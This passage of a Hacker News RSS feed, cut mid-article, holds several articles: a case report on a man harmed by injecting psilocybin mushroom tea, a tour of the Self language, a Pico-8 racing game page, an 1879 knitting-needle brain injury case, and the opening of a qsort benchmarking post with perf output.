<p>By injecting shrooms into his bloodstream, the 30-year-old patient had hoped to relieve symptoms of bipolar disorder and opioid dependence, according to the report. His family members noted that he had recently stopped adhering to his prescribed bipolar medications and was “cycling between depressive and manic states.”&nbsp;</p>
<p>The man found online reports that described the potential therapeutic effects of hallucinogens, such as <u>LSD</u> and psilocybin mushrooms, which prompted him to boil down shrooms into a “mushroom tea.” He filtered the tea by drawing it through a “cotton swab” before injecting it into his body. In the following days, he became lethargic and nauseated, and his skin began to yellow. He soon developed diarrhea and began vomiting blood.&nbsp;</p>
<p>His family found him and took him to the emergency room, noting concern that he also seemed very confused. The doctors noted that he could not participate in a meaningful interview, due to his altered mental state. Multiple organs, including the liver and kidneys, began to fail and the man was transferred to the ICU. His blood tested positive for a <u>bacterial</u> infection with the microbe <em>Brevibacillus </em>and a fungal infection from <em>Psilocybe cubensis </em>— meaning the magic mushroom he injected was now growing in his blood.</p>
<p>In addition to antibiotic and antifungal drugs, the man needed to be placed on a ventilator after he experienced acute respiratory failure, where fluid builds up in the air sacs of the lungs. Thankfully, the patient survived this ordeal and was later discharged from the hospital.</p>
<p>—Psychiatry’s new guide: 6 things you should know</p>
<p>—10 of the strangest medical studies (in recent history, that is)</p>
<p>—Hypersex to hoarding: 7 new psychological disorders&nbsp;</p>
<p>Research suggests that psilocybin may be a promising treatment for <u>depression</u>, <u>anxiety</u> and substance abuse, the authors noted — but only if taken safely. In most research studies, scientists administer the drug in pill form, but in a few instances, doctors have delivered psilocybin via an intravenous injection, according to a 2018 report published in the journal <u>Neuropharmacology</u>. But these injections are given in tightly controlled doses and under medical supervision, and they do not contain any fungi; the compound psilocybin, alone, is not alive and cannot grow in the body.</p>
<p>When used recreationally, magic mushrooms are typically made into a tea, eaten raw or dried, ground into a powder and put in capsules, or coated in chocolate — they are not injected directly into the bloodstream. Shrooms induce mind-altering trips by interacting with certain receptors in the brain; specifically, the psilocybin breaks down into psilocin, a substance that acts like the brain chemical serotonin, which plays roles in mood and perception.</p>
<p>But a bad trip can trigger anxiety, fear and confusion, as well as elevated blood pressure, vomiting, headaches and stomach cramps, <u>Live Science previously reported</u>. Magic mushrooms carry an added risk because they resemble some species of poisonous mushroom, so people sometimes consume the wrong kind by mistake.&nbsp;</p>
<p>Several U.S. cities have decriminalized psilocybin, and in November 2020, Oregon moved to legalize its use as a therapeutic drug, <u>CNBC reported</u>. As of now, psilocybin is still classified as a “Schedule I substance” under federal law, meaning that the drug has no accepted medical use in the U.S. and has a “high potential for abuse.” However, current research suggests that this potential for abuse has been historically overestimated and is actually quite low, according to the 2018 Neuropharmacology report.&nbsp;</p>
<p><em>Originally published on Live Science.</em>&nbsp;</p>
<p>Source: <a href="https://www.livescience.com/magic-mushroom-injection-case-report.html" target="_blank" rel="noopener noreferrer">Read Full Article</a></p>

<!-- AI CONTENT END 2 -->

		
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

</article>

<!-- #comments -->
		
		</main><!-- #main -->
	</section><!-- #primary -->
	
	
	<!-- #secondary -->

	
	
	</div></div>]]>
            </description>
            <link>https://mybestmedicine.com/health-news/magic-mushrooms-grow-in-mans-blood-after-injection-with-shroom-tea/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25786331</guid>
            <pubDate>Fri, 15 Jan 2021 02:44:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Tour of Self]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25784081">thread link</a>) | @todsacerdoti
<br/>
January 14, 2021 | https://sin-ack.github.io/posts/a-tour-of-self/ | <a href="https://web.archive.org/web/*/https://sin-ack.github.io/posts/a-tour-of-self/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>Hey there. This is the first post I will be making here, and I wanted to give a
tour of Self before making posts about my current implementation, mySelf.</p>
<p>Throughout this post, I will be showing examples from the regular implementation
of the Self programming environment, available
<a href="https://github.com/russellallen/self">here</a>.</p>
<h2 id="what-is-self">What is Self?</h2>
<p>To quote the <a href="https://selflanguage.org/">Self language homepage</a>:</p>
<blockquote>
<p>Self is a prototype-based dynamic object-oriented programming language,
environment, and virtual machine centered around the principles of simplicity,
uniformity, concreteness, and liveness. Self includes a programming language, a
collection of objects defined in the Self language, and a programming
environment built in Self for writing Self programs. The language and
environment attempt to present objects to the programmer and user in as direct
and physical a way as possible. The system uses the prototype-based style of
object construction.</p>
</blockquote>
<p>Self was designed at Xerox PARC by David Ungar and Randall B. Smith in 1986, and
was implemented at Stanford University. Development then continued at Sun
Microsystems before eventually stopping in the early 2000s.</p>
<h2 id="an-introduction-to-self">An introduction to Self</h2>
<p>Self is an image-based programming language, similar to Smalltalk. It provides
a <em>programming environment</em> that you interact with as the system is running. The
runtime is based on the idea of “processes”: each piece of Self code you run has
its own process (not an OS process – a Self process) in which it runs until
termination. During its runtime it can interact with other objects it can reach,
and create new ones.</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/processes.png" alt="Two processes: The left one is the scheduler (the root process), and the right one is a short-lived one created by the shell when I typed process this and evaluated it."> <figcaption>
            <p>Two processes: The left one
is the scheduler (the root process), and the right one is a short-lived one
created by the shell when I typed <code>process this</code> and evaluated it.</p>
        </figcaption>
</figure>

<p>Each object holds a number of slots, which can be added to and removed from
(facilitated by the programming environment). Slots can be mutable, in which
case they accept a message with their name and the new value as an argument.</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/slots.png" alt="This object has a mutable slot named foo (marked by the colon on the right). I can send it a message like foo: &amp;lsquo;bar&amp;rsquo; to set the value it points at to &amp;lsquo;bar&amp;rsquo;. Constant slots (like parent above) are marked with an equals sign."> <figcaption>
            <p>This object has a mutable slot
named <code>foo</code> (marked by the colon on the right). I can send it a
message like <code>foo: ‘bar’</code> to set the value it points at to ‘bar’.
Constant slots (like <code>parent</code> above) are marked with an equals sign.</p>
        </figcaption>
</figure>

<p>Objects can also hold code when they are assigned to a slot, in which case the
slot is called a <em>method</em>, and the code will be executed when a message is sent
to that slot. Methods can take arguments, and the keywords for each argument
after the first must start with a capital letter (due to the way message
precedence works in Self).</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/methods.png" alt="This object holds a method called bark, which will pop up a dialog box when it receives a message."> <figcaption>
            <p>This object holds a method
called <code>bark</code>, which will pop up a dialog box when it receives a
message.</p>
        </figcaption>
</figure>

<p>Self, unlike most object-oriented languages, is one which employs <em>prototypes</em>
for inheritance (like Javascript). Prototypes are objects which are the
canonical instance of a type. New “instances” are created by copying, or
cloning, the prototype and modifying its properties. Cloning is the only way to
create new “instances” in Self.</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/cloning.png" alt="Cloning a vector. The object
on the left is the vector prototype, and the one on the right is the &amp;ldquo;instance&amp;rdquo;
that I have created by cloning the prototype, marked by the &amp;ldquo;a&amp;rdquo; before its name."> <figcaption>
            <p>Cloning a vector. The object
on the left is the vector prototype, and the one on the right is the “instance”
that I have created by cloning the prototype, marked by the “a” before its name.</p>
        </figcaption>
</figure>

<p>Now, if you know a bit about Smalltalk (and Objective-C, sort of), in the
previous picture you might have spotted that I sent a message named <code>size</code> in
order to get the size of the newly created vector. You might ask “how did the
vector know how to respond to <code>size</code>”? That’s where <em>parent slots</em> come in.
In the image, <code>parent</code> is marked with a <code>*</code>, which signifies that it is a parent
slot. When a message is to be sent to a Self object, first the regular slots of
the object is searched, and if the slot is not found there, the parent is
searched, and this operation continues recursively until it reaches an object
which doesn’t have a parent (for most Self objects, this is <code>globals</code>, which
we will talk more about later).</p>
<p>Note that parent slots can be mutable too. You can change the behavior of an
object while it exists in Self (dynamic inheritance!).</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/parent_slot.png" alt="vector&amp;rsquo;s parent slot traits vector contains the defintion for the message size."> <figcaption>
            <p><code>vector</code>’s
parent slot <code>traits vector</code> contains the defintion for the message
<code>size</code>.</p>
        </figcaption>
</figure>

<p>One more thing you need to know about is <em>blocks</em>, which you might be familiar
with if you know Smalltalk or Objective-C. They are objects which hold a block
of code, and they execute the code and return the value when they are sent the
<code>value</code> message (they are just regular objects with special syntax, after all).</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/blocks.png" alt="A block which reports the
number it is given."> <figcaption>
            <p>A block which reports the
number it is given.</p>
        </figcaption>
</figure>

<p>This is almost all of the Self syntax. There is not much else to talk about with
regards to the language itself, because the rest of the Self system is
constructed in the programming environment.</p>
<h2 id="the-self-programming-environment">The Self Programming Environment</h2>
<p>All of the screenshots that I showed you were from Morphic, Self’s programming
environment interface. In Self, the easiest way to interact with the system is
by using the programming environment. The user interface is built using Morphic,
which is the UI framework powering the environment, built on X11 on GNU/Linux
and Quartz on macOS.</p>
<p>When you first start the <code>morphic</code> or <code>kitchensink</code> snapshots, you are greeted
with something like this:</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/self_window.png" alt="The initial window."> <figcaption>
            <p>The initial window.</p>
        </figcaption>
</figure>

<p>From here, there are a few ways you can start using the programming environment.
First thing you should know is that there are usually two types of context menus
for each <em>morph</em> (widget or layout, in modern terms) in the workspace:</p>
<ul>
<li>The <em>object menu</em>, which contains operations related to the functionality of
the morph. This can be setting the target for a button, or adding a slot to the
object that the outliner points to. It is opened with the middle click.</li>
<li>The <em>morph menu</em>, which contains operations related to the morph itself, and
ways of modifying it. For instance, you can click <code>Resize</code> to resize the
morph. It is opened with the right click.</li>
</ul>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/menus.png" alt="The object (yellow) and morph
(blue) menus."> <figcaption>
            <p>The object (yellow) and morph
(blue) menus.</p>
        </figcaption>
</figure>

<p>If you want to do something to what the morph is showing, you middle click it.
If you want to change the morph itself, you right click it.</p>
<p>The background (called world, or root) is middle-clickable, as well, and
contains many important menu items. It is where you find the options to create a
new object, and references to some important objects in the Self environment.</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/bg_menu.png" alt="The background (rootMorph) menu."> <figcaption>
            <p>The background (<code>rootMorph</code>) menu.</p>
        </figcaption>
</figure>

<h2 id="an-example">An example</h2>
<p>Let’s build the standard FizzBuzz as an example, going through the Self
programming environment while we do so. First off, let’s create a new object and
give it a few slots. <code>parent</code> will help us access the rest of the Self
environment via its value, <code>traits oddball</code> (trait for objects that are
one-of-a-kind, singleton if you must); <code>n</code>, which will be a mutable slot holding
the current number; and <code>fizzBuzzList</code>, which is what we will store our results
in (because we don’t have a terminal to print to). To do this, I first
middle-click the world and create a new object. Then I middle-click the outliner
(which are morphs that list the slots in an object, like an inspector) for the
new object, and select “Add Slot”. This opens an editor in which I can enter the
code for this slot. I enter the slot values for <code>parent</code>, <code>fizzBuzzList</code> and
<code>n</code>.</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/add_slot.png" alt="Adding a slot to the new object."> <figcaption>
            <p>Adding a slot to the new object.</p>
        </figcaption>
</figure>

<figure>
    <img src="https://sin-ack.github.io/images/tour1/slot_editor.png" alt="The editor for the new slot."> <figcaption>
            <p>The editor for the new slot.</p>
        </figcaption>
</figure>

<p>One thing to note is that we can do the association of slots with values
completely interactively. Let’s do this for the <code>fizzBuzzList</code> slot. First, I
will middle-click the world and select “Globals”, which will open the <code>globals</code>
object containing all world-reachable objects in Self (of which there are many).</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/globals.png" alt="The globals object."> <figcaption>
            <p>The globals object.</p>
        </figcaption>
</figure>

<p>Then I find the object I want (<code>sequence</code> for storing a sequence of values),
which is under <code>core &gt; collections &gt; ordered</code>. The standard library is nicely
organized and it is a lot of fun to discover what is available visually.</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/find_sequence.png" alt="Finding sequence in globals."> <figcaption>
            <p>Finding <code>sequence</code> in <code>globals</code>.</p>
        </figcaption>
</figure>

<p>We then fetch the object by clicking the symbol on its right, and create an
instance of it by opening the prompt and sending it the message
<code>copyRemoveAll</code> to get a sequence with no values in it.</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/sequence_copy.png" alt="Copying the sequence prototype."> <figcaption>
            <p>Copying the sequence prototype.</p>
        </figcaption>
</figure>

<p>Finally, I can associate this object with the <code>fizzBuzzList</code> slot in my new
object. I click the symbol next to <code>fizzBuzzList</code>, which pulls down <code>nil</code>. I
then drag the connector from <code>nil</code> to the new <code>sequence</code> instance I just
created, and it is now set. Of course, this is much easier to do by setting the
value of <code>fizzBuzzList</code> to <code>sequence copyRemoveAll</code> during slot creation, but
this allows you to set the value of slots to objects that are not well-known
(cannot be reached from <code>globals</code>), like the instance of <code>sequence</code> we had just
created. Plus, it is super cool to navigate the standard libarary.</p>
<figure>
    <img src="https://sin-ack.github.io/images/tour1/drag_connector.png" alt="Dragging the connector to the sequence."> <figcaption>
            <p>Dragging the connector to the sequence.</p>
        </figcaption>
</figure>

<figure>
    <img src="https://sin-ack.github.io/images/tour1/object_with_slots.png" alt="The final version
of our object, with all the slots we need."> <figcaption>
            <p>The final version
of our object, with all the slots we need.</p>
        </figcaption>
</figure>

<p>Now let’s evaluate some code to fill up that sequence. I click the “E” icon on
the top right corner of the object to open up a <em>prompt</em>. I can then enter code
here, and either “get it” (getting the result of the last statement) or “do it”
(just execute the code without grabbing any value).</p>
<p>This is the code for FizzBuzz:</p>
<!-- prettier-ignore -->
<div><pre><code data-lang="ruby"><span>1</span> <span>to</span><span>:</span> <span>100</span> <span>Do</span><span>:</span> <span>[|</span> <span>:i</span> <span>|</span>
    <span>((</span><span>i</span> <span>%</span> <span>15</span><span>)</span> <span>==</span> <span>0</span><span>)</span> <span>ifTrue</span><span>:</span> <span>[</span> <span>fizzBuzzList</span> <span>add</span><span>:</span> <span>'FizzBuzz'</span> <span>]</span> <span>False</span><span>:</span> <span>[</span>
    <span>((</span><span>i</span> <span>%</span> <span>5</span><span>)</span> <span>==</span> <span>0</span><span>)</span> <span>ifTrue</span><span>:</span> <span>[</span> <span>fizzBuzzList</span> <span>add</span><span>:</span> <span>'Buzz'</span> <span>]</span> <span>False</span><span>:</span> <span>[</span>
    <span>((</span><span>i</span> <span>%</span> <span>3</span><span>)</span> <span>==</span> <span>0</span><span>)</span> <span>ifTrue</span><span>:</span> <span>[</span> <span>fizzBuzzList</span> <span>add</span><span>:</span> <span>'Fizz'</span> <span>]</span> <span>False</span><span>:</span> <span>[</span>
        <span>fizzBuzzList</span> <span>add</span><span>:</span> <span>i</span>
    <span>]]].</span>
<span>].</span>
<span>fizzBuzzList</span></code></pre></div>
<p>When I execute this code, it will do the following:</p>
<ol>
<li>It will first send <code>1</code> the <code>to:Do:</code> message, creating a range loop during
which our outer block will execute.</li>
<li>In the block, we receive a parameter called <code>i</code> (denoted by the <code>:</code> before
the variable’s name). In Self, to have control flow, …</li></ol></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sin-ack.github.io/posts/a-tour-of-self/">https://sin-ack.github.io/posts/a-tour-of-self/</a></em></p>]]>
            </description>
            <link>https://sin-ack.github.io/posts/a-tour-of-self/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25784081</guid>
            <pubDate>Thu, 14 Jan 2021 22:55:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Virtua Racing de-make for Pico-8]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25783845">thread link</a>) | @tosh
<br/>
January 14, 2021 | https://freds72.itch.io/virtua-racing | <a href="https://web.archive.org/web/*/https://freds72.itch.io/virtua-racing">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper"><div id="inner_column"><div id="view_html_game_page_88173"><div><div><div><p>Virtua Racing port to <a href="https://lexaloffle.com/pico-8.php" target="_blank" rel="nofollow noopener">pico-8</a> fantasy console.</p>
<p>How to play:</p>
<ul><li>left/right: steering</li><li>O button: accelerate</li><li>X button: brake</li><li>Down: change point of view</li></ul>
<p>Features:</p>
<ul><li>All 3 tracks from SEGA Megadrive version</li><li>Iconic music&nbsp; tracks from <a href="http://evergreengames.itch.io/">@RubyRed</a> &amp; @Mavica</li><li>7 AI drivers</li><li>Arcade driving physics</li><li>High detail/low details settings (adjust from pause menu)</li></ul>
<p>3D assets are from the Megadrive edition - copyright their respective owner.<br></p>
<p>The "standalone" version requires the pico8 standalone application (for arcade cabinets or offline game stations).</p></div><h2 id="download">Download</h2><div><p>Click download now to get access to the following files:</p></div><section id="devlog"><h2>Development log</h2><ul><li><a href="https://freds72.itch.io/virtua-racing/devlog/119099/squeezing-pico-8-cpu">Squeezing PICO-8 CPU!</a><p><abbr title="12 January 2020 @ 20:49"><span></span> Jan 12, 2020</abbr></p></li><li><a href="https://freds72.itch.io/virtua-racing/devlog/100269/from-bytes-to-3d">From bytes to 3d</a><p><abbr title="16 September 2019 @ 21:14"><span></span> Sep 16, 2019</abbr></p></li></ul></section></div></div></div></div></div></div>]]>
            </description>
            <link>https://freds72.itch.io/virtua-racing</link>
            <guid isPermaLink="false">hacker-news-small-sites-25783845</guid>
            <pubDate>Thu, 14 Jan 2021 22:38:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Caution: “larking in the servants' hall” led to a knitting needle in the brain]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25783715">thread link</a>) | @vo2maxer
<br/>
January 14, 2021 | http://www.thomas-morris.uk/a-cautionary-tale/ | <a href="https://web.archive.org/web/*/http://www.thomas-morris.uk/a-cautionary-tale/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-4133">
	
	<!-- .entry-header -->


	<div>
				<p>This case was reported in the <em>Saint Bartholomew’s Hospital Reports </em>– the in-house journal published by the London hospital of the same name – in 1879. The author of this article, William Steavenson, was a 29-year-old house physician at Barts (as those familiar with the hospital call it). Steavenson’s interests included chronic asthma – from which he had suffered since childhood – and the uses of electricity in medicine, about which he wrote a textbook which was published on both sides of the Atlantic. He died at the tragically early age of 41 – killed by influenza, a vulnerable person during another terrible pandemic.</p>
<p><a href="http://www.thomas-morris.uk/wp-content/uploads/2021/01/Hemiplegia.jpg"><img loading="lazy" src="http://www.thomas-morris.uk/wp-content/uploads/2021/01/Hemiplegia.jpg" alt="unusual cause of hemiplegia" width="483" height="131" srcset="http://www.thomas-morris.uk/wp-content/uploads/2021/01/Hemiplegia.jpg 774w, http://www.thomas-morris.uk/wp-content/uploads/2021/01/Hemiplegia-300x81.jpg 300w, http://www.thomas-morris.uk/wp-content/uploads/2021/01/Hemiplegia-768x208.jpg 768w" sizes="(max-width: 483px) 100vw, 483px"></a></p>
<p><em>J.D., aged 21, a gentleman’s groom, was admitted into St. Bartholomew’s Hospital on April 23, 1879, recovering from right hemiplegia.</em></p>
<p>Hemiplegia is a form of paralysis affecting one side of the body. It is most often caused by injury to the brain or (sometimes) spine.</p>
<p><em>About sixteen months before, at his master’s residence in the country, when larking in the servants’ hall, he attempted to kiss the kitchen-maid.</em></p>
<p>An act that would not be described as ‘larking’ by many employers today. The question of whether the maid had the slightest interest in being kissed by the groom is not addressed.</p>
<p><em>This young person had been engaged in knitting, and had one of the knitting-needles placed behind her left ear.</em></p>
<p>Can you guess what happened next?</p>
<p><em>As the face of the groom approached that of the young woman, the knitting-needle entered his left orbit, passing between the bone and the eyeball, to the depth, it is said, of four inches, no doubt entering the brain.</em></p>
<p>Or around 10 cm. Quite a long way into the brain, in all likelihood.</p>
<p><em>It must be supposed that the ardour of the young man was extreme, and that most likely the needle obtained a&nbsp;</em>point&nbsp;d’appui<em>&nbsp;</em><em>in the lady’s back hair</em>…</p>
<p>A <em>point d’appui </em>(literally, ‘fulcrum’) is a military term meaning a base or strong point.</p>
<p><em>…but such was the confusion following the occurrence that the history on these points is not very clear; but this much is certain, that J. D. retired from the encounter with the knitting-needle protruding from his orbit.</em></p>
<p>A vignette of extreme horror or high slapstick, depending on your point of view.</p>
<p><em>He says he removed it with his own hand.</em></p>
<p>Not, in general, a good idea. If in doubt, leave a foreign object in place and let a doctor take it out for you.</p>
<p><em>It was followed by some bleeding, and he then fainted. </em></p>
<p>Understandably.</p>
<p><em>We therefore have no accurate knowledge of the exact direction of the implement, but, from the symptoms which followed, it is very probable that it passed through the sphenoidal fissure, and must ultimately have injured the brain somewhere in the neighbourhood of the third left frontal convolution, or what is called Broca’s convolution</em>.</p>
<p>The sphenoidal or superior orbital fissure is a gap between two bones at the back of the eye socket. More interesting, however, is the reference to ‘Broca’s convolution’ (known today as <a href="https://en.wikipedia.org/wiki/Broca%27s_area">Broca’s area</a>), a region of the left frontal lobe of the brain.</p>
<p>In the 1860s a physician in France, <a href="https://en.wikipedia.org/wiki/Paul_Broca">Pierre Paul Broca</a>, encountered several patients with aphasia (inability to speak) who all turned out to have lesions in the same region of the brain. This was the first convincing evidence for the localisation of brain function – the idea that particular areas of the brain perform specialised tasks. Experimental work over the following decades established that other parts of the brain were associated with other functions such as locomotion and sensory abilities.</p>
<p>In the hospital post-mortem room, Dr Steavenson performed experiments on several cadavers, passing knitting needles through their eye sockets to find out which parts of the brain might be injured, and found that it was quite feasible for a needle to reach Broca’s area. Half a century later the Edinburgh surgeon David Greig <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5305753/?page=23">performed a similar experiment</a> (using a skull rather than a complete cadaver) and X-rayed the results, demonstrating the range of angles at which a knitting needle might enter the brain via this route:</p>
<figure id="attachment_4135" aria-describedby="caption-attachment-4135"><a href="http://www.thomas-morris.uk/wp-content/uploads/2021/01/skull-needle.jpg"><img loading="lazy" src="http://www.thomas-morris.uk/wp-content/uploads/2021/01/skull-needle.jpg" alt="x-ray of skull with needles" width="720" height="536" srcset="http://www.thomas-morris.uk/wp-content/uploads/2021/01/skull-needle.jpg 720w, http://www.thomas-morris.uk/wp-content/uploads/2021/01/skull-needle-300x223.jpg 300w" sizes="(max-width: 720px) 100vw, 720px"></a><figcaption id="caption-attachment-4135">X-ray of skull (1924) showing range of possible angles taken by knitting needle through the orbit</figcaption></figure>
<p>As for Dr Steavenson’s patient:</p>
<p><em>The injury at the time caused the patient intense pain, but did not injure his sight. Up to the fifth day after the accident he could talk and use his right arm and leg. Then he lost all power over his right upper extremity, side, and leg. The lower part of the right side of his face was paralysed, and he could not whistle. The right side of the tongue was also paralysed. The paralysis came on at night. At first the paralysed parts felt cold and dead, but he did not lose sensation. He lost the power of speech for two months.</em></p>
<p>The symptom observed by Broca in his patients, known clinically as aphasia.</p>
<p><em>On his admission to the Salop Infirmary at Shrewsbury a short time after the accident, he could only say the words “Yes, yes,” which he answered to every question.</em></p>
<p>Broca’s first patient could only utter the syllable ‘tan’, and would respond to any question with the phrase ‘tan, tan’.</p>
<p><em>The almost total paralysis remained as long as the aphasia, viz., for two months. He never lost power over his sphincters. He is now gradually recovering power over all the paralysed parts. Occasionally he has severe aching in the back of his head and on the left side of his neck, which lasts for some hours. His memory is good. He has had three epileptiform fits since the accident, one in December 1878, one in February of this year, and one in April a few days before admission.</em></p>
<p>The patient was, it seems, somewhat improved by the time he was transferred to Bart’s.</p>
<p><em>On admission, he had the appearance of being a strong, robust man in perfect health, with a florid complexion. He complained of inability to use his right hand or fingers, with weakness and only partial power over his right side, arm, and lower extremity…He remained under observation about five weeks, with galvanism applied to his arm and hand…</em></p>
<p>Galvanism is the medical use of electricity, often used at this date to treat paralysis. Since it had long been known that muscle fibres contracted when a current was passed through them, it seemed logical to apply electricity in this way. Dr Steavenson was an acknowledged authority on the subject, appointed the first head of the Barts <a href="http://www.calmhosting01.com/BartsHealth/CalmView/Record.aspx?src=CalmView.Catalog&amp;id=SBHB%2FEC">Electrical Department</a> on its foundation in 1882.</p>
<p><em>…the hand placed in the intervals upon a splint to try and bring the fingers straight, but very little improvement was observed in his condition from the time when he entered the Hospital. The contraction and rigidity of the flexors of the forearm were of too old standing to expect much improvement. He had no fits while under treatment</em></p>
<p>The human brain is a remarkable thing, but its ability to heal after physical injury is limited. There was nothing the doctors could do for this patient beyond careful rehabilitation, but he still seems to have recovered most of the function he lost in the immediate aftermath of the accident. The fact that he even survived four inches of knitting needle inside his skull is pretty extraordinary.</p>

	</div><!-- .entry-content -->
	
	<!-- .entry-footer -->

</article></div>]]>
            </description>
            <link>http://www.thomas-morris.uk/a-cautionary-tale/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25783715</guid>
            <pubDate>Thu, 14 Jan 2021 22:30:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Beating Up on Qsort (2019)]]>
            </title>
            <description>
<![CDATA[
Score 80 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25783617">thread link</a>) | @tjalfi
<br/>
January 14, 2021 | https://travisdowns.github.io/blog/2019/05/22/sorting.html | <a href="https://web.archive.org/web/*/https://travisdowns.github.io/blog/2019/05/22/sorting.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Recently, Daniel Lemire <a href="https://lemire.me/blog/2019/05/07/almost-picking-n-distinct-numbers-at-random/">tackled the topic</a> of selecting N <em>distinct</em> numbers at random. In the case we want sorted output, an obvious solution presents itself: sorting randomly chosen values and de-duplicating the list, which is easy since identical values are now adjacent.<sup id="fnref:distinct" role="doc-noteref"><a href="#fn:distinct">1</a></sup></p>

<p>While Daniel suggests a clever method of avoiding a sort entirely<sup id="fnref:danmethod" role="doc-noteref"><a href="#fn:danmethod">2</a></sup>, I’m also interested in they <em>why</em> for the underlying performace of the sort method: it takes more than 100 ns per element, which means 100s of CPU clock cycles and usually even more instructions than that (on a superscalar processor)! As a sanity check, a quick benchmark (<code>perf record ./bench &amp;&amp; perf report</code>) shows that more than 90% of the time spent in this approach is in the sorting routine, <a href="https://devdocs.io/c/algorithm/qsort">qsort</a> - so we are right to focus on this step, rather than say the de-duplication step or the initial random number generation. This naturally, this raises the question: how fast is qsort when it comes to sorting integers and can we do better?</p>

<p>All of the code for this post <a href="https://github.com/travisdowns/sort-bench">is available on GitHub</a>, so if you’d like to follow along with the code open in an editor, go right ahead (warning: there are obviously some spoilers if you dig through the code first).</p>

<h2 id="benchmarking-qsort">Benchmarking Qsort</h2>

<p>First, let’s take a look at what <code>qsort</code> is doing, to see if there is any delicous low-hanging performance fruit. We use <code>perf record ./bench qsort</code> to capture profiling data, and <code>perf report --stdio</code> to print a summary<sup id="fnref:long-tail" role="doc-noteref"><a href="#fn:long-tail">3</a></sup>:</p>

<div><div><pre><code># Samples: 101K of event 'cycles:ppp'
# Event count (approx.): 65312285835
#
# Overhead  Command  Shared Object      Symbol
# ........  .......  .................  ..............................................
#
    64.90%  bench    libc-2.23.so       [.] msort_with_tmp.part.0
    21.45%  bench    bench              [.] compare_uint64_t
     8.65%  bench    libc-2.23.so       [.] __memcpy_sse2
     0.87%  bench    libc-2.23.so       [.] __memcpy_avx_unaligned
     0.83%  bench    bench              [.] main
     0.41%  bench    [kernel.kallsyms]  [k] clear_page_erms
     0.34%  bench    [kernel.kallsyms]  [k] native_irq_return_iret
     0.31%  bench    bench              [.] bench_one
</code></pre></div></div>

<p>The assembly for the biggest offender, <code>msort_with_tmp</code> looks like this<sup id="fnref:annotate-command" role="doc-noteref"><a href="#fn:annotate-command">4</a></sup> :</p>

<div><div><pre><code> Percent | Address      | Disassembly
--------------------------------------------------
   30.55 :   39200:       mov    rax,QWORD PTR [r15]
    0.61 :   39203:       sub    rbp,0x1
    0.52 :   39207:       add    r15,0x8
    7.30 :   3920b:       mov    QWORD PTR [rbx],rax
    0.39 :   3920e:       add    rbx,0x8
    0.07 :   39212:       test   r12,r12
    0.09 :   39215:       je     390e0   ; merge finished
    1.11 :   3921b:       test   rbp,rbp
    0.01 :   3921e:       je     390e0   ; merge finished
    5.24 :   39224:       mov    rdx,QWORD PTR [rsp+0x8]
    0.42 :   39229:       mov    rsi,r15
    0.19 :   3922c:       mov    rdi,r13
    6.08 :   3922f:       call   r14
    0.59 :   39232:       test   eax,eax
    3.52 :   39234:       jg     39200
   32.69 :   39236:       mov    rax,QWORD PTR [r13+0x0]
    1.31 :   3923a:       sub    r12,0x1
    1.01 :   3923e:       add    r13,0x8
    1.09 :   39242:       jmp    3920b &lt;bsearch@@GLIBC_2.2.5+0x205b&gt;
</code></pre></div></div>

<p>Depending on your level of assembly reading skill, it may not be obvious, but this is basically a classic merge routine: it is merging two lists by comparing the top elements of each list (pointed to by <code>r13</code> and <code>r15</code>), and then storing the smaller element (the line <code>QWORD PTR [rbx],rax</code>) and loading the next element from that list. There are also two checks for termination (<code>test   r12,r12</code> and <code>test   rbp,rbp</code>). This hot loop corresponds directly to this code from <code>glibc</code> (from the file<code>msort.c</code><sup id="fnref:msort-note" role="doc-noteref"><a href="#fn:msort-note">5</a></sup>) :</p>

<div><div><pre><code><span>while</span> <span>(</span><span>n1</span> <span>&gt;</span> <span>0</span> <span>&amp;&amp;</span> <span>n2</span> <span>&gt;</span> <span>0</span><span>)</span>
<span>{</span>
    <span>if</span> <span>((</span><span>*</span><span>cmp</span><span>)</span> <span>(</span><span>b1</span><span>,</span> <span>b2</span><span>,</span> <span>arg</span><span>)</span> <span>&lt;=</span> <span>0</span><span>)</span>
    <span>{</span>
        <span>*</span><span>(</span><span>uint64_t</span> <span>*</span><span>)</span> <span>tmp</span> <span>=</span> <span>*</span><span>(</span><span>uint64_t</span> <span>*</span><span>)</span> <span>b1</span><span>;</span>
        <span>b1</span> <span>+=</span> <span>sizeof</span> <span>(</span><span>uint64_t</span><span>);</span>
        <span>--</span><span>n1</span><span>;</span>
    <span>}</span>
